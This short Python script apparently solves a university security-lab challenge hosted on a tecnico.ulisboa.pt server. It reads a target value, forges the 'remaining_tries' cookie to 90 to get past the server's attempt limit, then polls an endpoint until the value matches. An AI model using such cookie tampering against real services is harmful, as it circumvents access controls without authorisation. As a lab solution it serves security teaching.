import requests

session = requests.Session()
site = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/hello'
more = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/more'
finish = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/finish'
response = session.get(site)
cookie = response.cookies

print(response.text, cookie)
print(int(response.text.split('your target ')[1].split('.<br>')[0]))

target = int(response.text.split('your target ')[1].split('.<br>')[0])

number = 0

cookie.set('remaining_tries', '90')


while True:
    response = requests.get(more, cookies = cookie)
    result = int(response.text.split('current value is: ')[1].split('<br>')[0])
    print (response.text)
    if result == target:
        print(requests.get(finish, cookies = cookie).text)
        break
        